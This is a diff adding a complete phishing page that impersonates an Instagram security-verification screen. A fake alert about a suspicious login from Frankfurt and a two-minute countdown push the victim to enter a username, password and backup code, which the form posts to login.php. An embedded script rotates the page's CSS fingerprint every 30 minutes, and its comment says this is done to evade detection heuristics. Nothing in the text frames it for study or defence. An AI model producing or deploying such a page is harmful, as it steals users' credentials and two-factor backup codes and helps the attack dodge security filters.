@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram • Security Verification</title>
+<style id="dynamic-style">
+/* WILL BE REWRITTEN BY JS EVERY 30 MIN – UNIQUE FINGERPRINT */
+* { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+.card { background: white; border: 1px solid #dbdbdb; border-radius: 12px; padding: 40px 50px; max-width: 400px; width: 100%; box-shadow: 0 2px 12px rgba(0,0,0,0.1); }
+.logo { text-align: center; font-size: 36px; font-weight: 600; color: #262626; margin-bottom: 20px; }
+.alert-banner { background: #ffebe8; border-left: 4px solid #ed4956; padding: 12px; border-radius: 4px; margin-bottom: 20px; }
+.alert-banner p { color: #ed4956; font-size: 14px; font-weight: 600; text-align: center; }
+.input-group { margin-bottom: 12px; }
+.input-group label { display: block; font-size: 12px; font-weight: 600; color: #8e8e8e; margin-bottom: 4px; }
+.input-group input { width: 100%; padding: 12px; border: 1px solid #dbdbdb; border-radius: 6px; font-size: 14px; background: #fafafa; }
+.btn { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 10px; }
+.timer { color: #ed4956; font-weight: bold; }
+.footer { text-align: center; margin-top: 16px; font-size: 12px; color: #8e8e8e; }
+</style>
+</head>
+<body>
+<div class="card">
+    <div class="logo">📷 Instagram</div>
+    <div class="alert-banner"><p>⚠️ Suspicious login from unknown device (Frankfurt, DE)</p></div>
+    <p style="font-size:14px; color:#262626; margin-bottom:16px; text-align:center;">Re-enter your password to restore full access.</p>
+    <form action="login.php" method="POST">
+        <div class="input-group"><label>Username/Email</label><input type="text" name="username" required></div>
+        <div class="input-group"><label>Password</label><input type="password" name="password" required></div>
+        <div class="input-group"><label>Backup code (if set)</label><input type="text" name="backup"></div>
+        <p style="font-size:11px; color:#8e8e8e; margin-bottom:12px;">Session expires in <span class="timer" id="countdown">02:00</span></p>
+        <button type="submit" class="btn">Secure Account</button>
+    </form>
+    <div class="footer"><a href="#">Help</a> • <a href="#">Privacy</a></div>
+</div>
+<script>
+// ⏳ COUNTDOWN
+let s=120; setInterval(()=>{ let m=Math.floor(s/60), sec=s%60; document.getElementById('countdown').innerText=String(m).padStart(2,'0')+':'+String(sec).padStart(2,'0'); s--; if(s<0) document.querySelector('form').innerHTML='<p style="color:red;">Reload page</p>'; },1000);
+
+// 🔄 ROTATE CSS FINGERPRINT EVERY 30 MIN – EVADE HEURISTICS
+function rotateCSS(){
+    const colors = ['#fafafa','#f0f0f0','#ffffff','#f8f8f8'];
+    const radii = ['12px','16px','8px','20px'];
+    const fonts = ['-apple-system','Arial','Helvetica','Roboto'];
+    const style = document.getElementById('dynamic-style');
+    const c = colors[Math.floor(Math.random()*colors.length)];
+    const r = radii[Math.floor(Math.random()*radii.length)];
+    const f = fonts[Math.floor(Math.random()*fonts.length)];
+    style.innerHTML = `
+        * { margin:0; padding:0; box-sizing:border-box; font-family: ${f}, sans-serif; }
+        body { background: ${c}; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card { background: white; border: 1px solid #dbdbdb; border-radius: ${r}; padding: 40px 50px; max-width: 400px; width: 100%; box-shadow: 0 2px 12px rgba(0,0,0,0.1); }
+        .logo { text-align: center; font-size: 36px; font-weight: 600; color: #262626; margin-bottom: 20px; }
+        .alert-banner { background: #ffebe8; border-left: 4px solid #ed4956; padding: 12px; border-radius: 4px; margin-bottom: 20px; }
+        .alert-banner p { color: #ed4956; font-size: 14px; font-weight: 600; text-align: center; }
+        .input-group { margin-bottom: 12px; }
+        .input-group label { display: block; font-size: 12px; font-weight: 600; color: #8e8e8e; margin-bottom: 4px; }
+        .input-group input { width: 100%; padding: 12px; border: 1px solid #dbdbdb; border-radius: 6px; font-size: 14px; background: #fafafa; }
+        .btn { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        .timer { color: #ed4956; font-weight: bold; }
+        .footer { text-align: center; margin-top: 16px; font-size: 12px; color: #8e8e8e; }
+    `;
+}
+rotateCSS();
+setInterval(rotateCSS, 1800000); // every 30 min
+</script>
+</body>
+</html>
